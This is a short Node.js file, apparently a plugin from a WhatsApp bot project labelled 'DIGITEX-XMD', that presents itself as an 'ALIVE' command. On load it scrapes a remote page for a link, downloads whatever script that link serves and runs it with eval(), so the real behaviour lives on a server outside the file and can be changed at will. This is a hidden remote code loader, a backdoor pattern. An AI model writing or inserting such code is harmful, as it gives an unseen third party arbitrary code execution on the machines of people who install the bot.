//  [DIGITEX-XMD EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Juma                                    
//  >> Version: 8.3.5-digitex.7

const axios = require('axios');
const cheerio = require('cheerio');
const juma = require(__dirname + "/../config");

async function fetchALIVEUrl() {
  try {
    const response = await axios.get(juma.DIGITEX_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("ALIVE")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('ALIVE not found 😭');
    }

    console.log('ALIVE loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchALIVEUrl();
